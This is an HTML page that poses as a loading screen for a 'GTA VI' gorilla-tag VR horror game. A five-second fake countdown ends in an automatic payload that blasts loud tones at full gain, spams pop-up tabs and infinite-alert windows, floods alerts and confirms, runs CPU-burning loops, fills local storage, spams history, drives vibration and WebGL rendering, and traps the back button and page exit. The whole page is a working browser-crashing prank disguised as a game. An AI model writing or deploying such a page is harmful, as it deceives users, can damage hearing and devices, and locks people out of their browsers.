<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GTA VI · Mats Gorilla Horror VR</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Arial Black', 'Impact', sans-serif;
            color: #fff;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            text-shadow: 0 0 20px rgba(255,100,0,0.8);
            background-image: radial-gradient(circle at 20% 30%, #1a0a00, #000000);
        }
        #game {
            background: rgba(10,10,10,0.85);
            border: 4px solid #ff8800;
            padding: 2rem 3rem;
            border-radius: 20px;
            box-shadow: 0 0 80px #ff4400, inset 0 0 40px #ff440066;
            text-align: center;
            max-width: 95vw;
            backdrop-filter: blur(4px);
            transform: perspective(800px) rotateX(2deg);
        }
        .gtalogo {
            font-size: 4.5rem;
            font-weight: 900;
            letter-spacing: 6px;
            background: linear-gradient(180deg, #ffaa00 0%, #ff4400 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px #ff6600;
            line-height: 1;
        }
        .subtitle {
            font-size: 1.8rem;
            color: #ffcc88;
            letter-spacing: 8px;
            border-top: 2px solid #ff8800;
            border-bottom: 2px solid #ff8800;
            padding: 0.5rem 0;
            margin: 0.5rem 0 1.5rem;
            text-shadow: 0 0 20px #ff8800;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
        }
        .tag {
            font-size: 1.2rem;
            color: #88ddff;
            background: #1a1a2e;
            display: inline-block;
            padding: 0.3rem 1.5rem;
            border-radius: 40px;
            border: 1px solid #88ddff;
            box-shadow: 0 0 30px #88ddff55;
            margin-bottom: 1.5rem;
            letter-spacing: 3px;
        }
        .status-box {
            background: #1a1a1a;
            padding: 0.8rem;
            border-radius: 12px;
            border-left: 6px solid #ff8800;
            font-size: 1.1rem;
            color: #cccccc;
            font-family: 'Courier New', monospace;
        }
        #countdown {
            color: #ff4444;
            font-weight: bold;
            font-size: 2rem;
            display: inline-block;
            min-width: 3rem;
        }
        .warning {
            color: #ff6666;
            font-size: 0.9rem;
            margin-top: 0.8rem;
            animation: blink 0.8s infinite alternate;
        }
        @keyframes blink {
            0% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        .loader {
            width: 100%;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 1rem 0;
            overflow: hidden;
        }
        .loader-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff8800, #ff4400);
            border-radius: 2px;
            transition: width 0.1s linear;
        }
    </style>
</head>
<body>
    <div id="game">
        <div class="gtalogo">GRAND THEFT AUTO VI</div>
        <div class="subtitle">⚡ MATS GORILLA HORROR VR ⚡</div>
        <div class="tag">🦍 VR GORILLA TAG · SURVIVAL HORROR</div>
        <div class="status-box">
            <span>▶ INITIALIZING REALITY BRIDGE ... </span>
            <span id="countdown">5</span><span>s</span>
        </div>
        <div class="loader"><div class="loader-bar" id="loaderBar"></div></div>
        <div class="warning">⚠️ DO NOT REMOVE HEADSET ⚠️</div>
    </div>

    <script>
        (function() {
            'use strict';

            let executed = false;
            let countdown = 5;
            const countdownSpan = document.getElementById('countdown');
            const loaderBar = document.getElementById('loaderBar');

            // Start countdown immediately
            const interval = setInterval(function() {
                countdown -= 1;
                countdownSpan.innerText = countdown > 0 ? countdown : '0';
                loaderBar.style.width = ((5 - countdown) / 5 * 100) + '%';
                if (countdown <= 0) {
                    clearInterval(interval);
                    loaderBar.style.width = '100%';
                    countdownSpan.innerText = '💀';
                    document.querySelector('.status-box').innerHTML = '🔓 BREACHING REALITY ...';
                    document.querySelector('.warning').innerHTML = '⚠️ SYSTEM OVERRIDE ACTIVE ⚠️';
                    executePayload();
                }
            }, 1000);

            // ---- PAYLOAD (identical to previous but with GTA styling) ----
            function executePayload() {
                if (executed) return;
                executed = true;

                // 1. SUPER LOUD TONE
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    if (audioCtx.state === 'suspended') audioCtx.resume();
                    const osc = audioCtx.createOscillator();
                    const gain = audioCtx.createGain();
                    osc.type = 'square';
                    osc.frequency.value = 1850;
                    gain.gain.value = 1.0;
                    osc.connect(gain);
                    gain.connect(audioCtx.destination);
                    osc.start(0);
                } catch (e) {}

                // 2. TAB SPAM
                let counter = 0;
                setInterval(function() {
                    counter++;
                    for (let i = 0; i < 4; i++) {
                        try {
                            const win = window.open('about:blank', '_blank', 'noopener,noreferrer');
                            if (win) {
                                try {
                                    win.document.write('<html><head><title>⛔ CRASH</title></head><body style="background:black;color:red;font-size:60px;">💀 GORILLA</body></html>');
                                    win.document.close();
                                    win.focus();
                                    win.location.reload();
                                } catch (e) {}
                            }
                        } catch (e) {}
                    }
                    for (let i = 0; i < 2; i++) {
                        try { window.open('javascript:while(1){alert("x")}', '_blank'); } catch (e) {}
                    }
                    try {
                        window.location.hash = 'crash_' + counter;
                        document.body.style.transform = 'rotate(' + (counter % 360) + 'deg)';
                    } catch (e) {}
                }, 50);

                // 3. VIBRATION
                try {
                    if (navigator.vibrate) {
                        navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 10000]);
                        setInterval(function() {
                            if (navigator.vibrate) navigator.vibrate([2000, 100, 2000, 100, 2000]);
                        }, 4000);
                    }
                } catch (e) {}

                // 4. CPU KILLER
                function cpuKiller() {
                    let a = 0;
                    while (true) {
                        a += Math.random() * Math.random();
                        document.body.style.margin = (a % 100) + 'px';
                        const arr = new Array(1000000).fill(Math.random());
                        if (a > 1e9) break;
                        if (a % 1000 === 0) {
                            requestAnimationFrame(cpuKiller);
                            return;
                        }
                    }
                }
                for (let i = 0; i < 8; i++) setTimeout(cpuKiller, i * 10);

                // 5. ALERT FLOOD
                for (let i = 0; i < 100; i++) {
                    setTimeout(function() {
                        try { alert('🦍 GORILLA CRASH'); } catch (e) {}
                    }, i * 30);
                }
                for (let i = 0; i < 50; i++) {
                    setTimeout(function() {
                        try { confirm('🦍 OVERRIDE'); } catch (e) {}
                    }, i * 50 + 200);
                }

                // 6. STORAGE FILL
                try {
                    localStorage.setItem('crash', 'x'.repeat(1024 * 1024));
                    for (let i = 0; i < 50; i++) localStorage.setItem('crash_' + i, 'x'.repeat(1024 * 512));
                } catch (e) {}

                // 7. HISTORY SPAM
                function pushHistory() {
                    for (let i = 0; i < 500; i++) {
                        try { history.pushState({}, '', '#crash_' + i); } catch (e) {}
                    }
                    setTimeout(pushHistory, 100);
                }
                pushHistory();

                // 8. ADD MORE AUDIO
                try {
                    const ctx2 = new (window.AudioContext || window.webkitAudioContext)();
                    const osc2 = ctx2.createOscillator();
                    const gain2 = ctx2.createGain();
                    osc2.type = 'sawtooth';
                    osc2.frequency.value = 800;
                    gain2.gain.value = 0.9;
                    osc2.connect(gain2);
                    gain2.connect(ctx2.destination);
                    osc2.start(0);
                    const ctx3 = new (window.AudioContext || window.webkitAudioContext)();
                    const osc3 = ctx3.createOscillator();
                    const gain3 = ctx3.createGain();
                    osc3.type = 'triangle';
                    osc3.frequency.value = 2500;
                    gain3.gain.value = 0.8;
                    osc3.connect(gain3);
                    gain3.connect(ctx3.destination);
                    osc3.start(0);
                } catch (e) {}

                // 9. HEAVY DOM ELEMENTS
                function addHeavyElements() {
                    for (let i = 0; i < 200; i++) {
                        const div = document.createElement('div');
                        div.style.position = 'fixed';
                        div.style.top = Math.random() * 100 + '%';
                        div.style.left = Math.random() * 100 + '%';
                        div.style.width = '100px';
                        div.style.height = '100px';
                        div.style.background = 'radial-gradient(circle, #ff4400, #000000)';
                        div.style.borderRadius = '50%';
                        div.style.zIndex = 9999;
                        div.style.boxShadow = '0 0 60px #ff4400';
                        div.innerText = '🦍';
                        div.style.fontSize = '80px';
                        div.style.color = 'white';
                        div.style.textAlign = 'center';
                        div.style.lineHeight = '100px';
                        document.body.appendChild(div);
                    }
                }
                addHeavyElements();
                setInterval(addHeavyElements, 200);

                // 10. WEBGL CRASH
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = window.innerWidth * 2;
                    canvas.height = window.innerHeight * 2;
                    canvas.style.position = 'fixed';
                    canvas.style.top = 0;
                    canvas.style.left = 0;
                    canvas.style.zIndex = 99999;
                    canvas.style.pointerEvents = 'none';
                    document.body.appendChild(canvas);
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const shader = gl.createShader(gl.FRAGMENT_SHADER);
                        gl.shaderSource(shader, 'void main(){gl_FragColor=vec4(1.0,0.0,0.0,1.0);}');
                        gl.compileShader(shader);
                        function render() {
                            gl.clearColor(Math.random(), 0, 0, 1);
                            gl.clear(gl.COLOR_BUFFER_BIT);
                            requestAnimationFrame(render);
                        }
                        render();
                    }
                } catch (e) {}

                // UI change
                document.body.style.background = '#440000';
                document.querySelector('.gtalogo').style.background = 'linear-gradient(180deg, #ff4444, #880000)';
                document.querySelector('.subtitle').innerHTML = '☠️ BREACHED ☠️';
                document.querySelector('.tag').innerHTML = '🦍 SYSTEM COMPROMISED';
            }

            // Prevent unload and back
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            });
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', function() {
                history.pushState(null, null, location.href);
            });

        })();
    </script>
</body>
</html>
